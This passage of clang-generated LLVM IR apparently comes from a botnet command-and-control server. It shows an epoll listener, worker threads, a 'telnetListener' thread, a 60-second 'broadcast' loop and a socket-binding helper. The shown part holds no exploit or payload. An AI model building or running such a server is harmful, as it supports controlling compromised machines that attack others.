  store i32 %55, i32* %57, align 1
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %9, i32 0, i32 0
  store i32 -2147483647, i32* %58, align 1
  %59 = load volatile i32, i32* @epollFD, align 4
  %60 = load volatile i32, i32* @listenFD, align 4
  %61 = call i32 @epoll_ctl(i32 %59, i32 1, i32 %60, %struct.epoll_event* %9) #11
  store i32 %61, i32* %6, align 4
  %62 = load i32, i32* %6, align 4
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %65

64:                                               ; preds = %54
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  call void @abort() #15
  unreachable

65:                                               ; preds = %54
  %66 = load i32, i32* %7, align 4
  %67 = add nsw i32 %66, 2
  %68 = zext i32 %67 to i64
  %69 = call i8* @llvm.stacksave()
  store i8* %69, i8** %10, align 8
  %70 = alloca i64, i64 %68, align 16
  store i64 %68, i64* %11, align 8
  br label %71

71:                                               ; preds = %75, %65
  %72 = load i32, i32* %7, align 4
  %73 = add nsw i32 %72, -1
  store i32 %73, i32* %7, align 4
  %74 = icmp ne i32 %72, 0
  br i1 %74, label %75, label %81

75:                                               ; preds = %71
  %76 = load i32, i32* %7, align 4
  %77 = add nsw i32 %76, 1
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i64, i64* %70, i64 %78
  %80 = call i32 @pthread_create(i64* %79, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #11
  br label %71, !llvm.loop !18

81:                                               ; preds = %71
  %82 = getelementptr inbounds i64, i64* %70, i64 0
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = inttoptr i64 %84 to i8*
  %86 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %85) #11
  br label %87

87:                                               ; preds = %88, %81
  br label %88

88:                                               ; preds = %87
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1)
  %89 = call i32 @sleep(i32 60)
  br label %87
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #11
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.29, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #11
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #11
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #11
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !19

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.31, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #11
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #8

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #9

declare i32 @sleep(i32) #1

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { nofree nosync nounwind willreturn }
attributes #10 = { nounwind readonly willreturn }
attributes #11 = { nounwind }
attributes #12 = { nounwind readnone willreturn }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
